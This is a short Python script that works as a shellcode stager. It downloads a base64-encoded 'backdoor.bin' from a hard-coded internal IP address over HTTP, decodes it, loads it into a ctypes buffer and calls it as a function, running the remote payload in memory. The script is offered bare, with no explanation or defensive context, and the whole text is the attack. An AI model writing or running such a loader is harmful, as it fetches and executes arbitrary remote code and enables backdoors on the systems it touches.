#!/usr/bin/python
from urllib.request import urlopen
import ctypes
import base64
pullhttp = urlopen("http://192.168.108.114:8000/backdoor.bin")
shellcode = base64.b64decode(pullhttp.read())
codemem_buff = ctypes.create_string_buffer(shellcode, len(shellcode))
exploit_func = ctypes.cast(codemem_buff, ctypes.CFUNCTYPE (ctypes.c_void_p))
exploit_func()
